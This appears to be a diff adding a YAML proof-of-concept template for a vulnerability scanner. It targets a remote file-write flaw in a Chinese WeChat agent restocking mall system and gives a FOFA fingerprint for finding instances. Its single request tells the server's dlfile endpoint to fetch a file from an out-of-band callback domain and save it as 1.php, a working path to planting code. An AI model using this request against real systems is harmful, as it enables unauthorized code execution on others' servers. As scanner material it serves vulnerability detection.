@@ -1,0 +1,21 @@
+id: poc-yaml-internet-wechat-dlfile-upload
+info:
+  name: 微商代理商补货商城系统 dlfile?file_url存在远程文件写入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 任意写入
+  finger: 微商代理商补货商城系统
+  fofa: /template/mobile/new/static/assets/js/comm.js
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /home/test/dlfile?file_url=http://{{.reverseDomain}}/1.txt&save_to=1.php
+  expression: 'status_code == 200 &&
+
+    reverse.Verify()
+
+    '
+transport: http
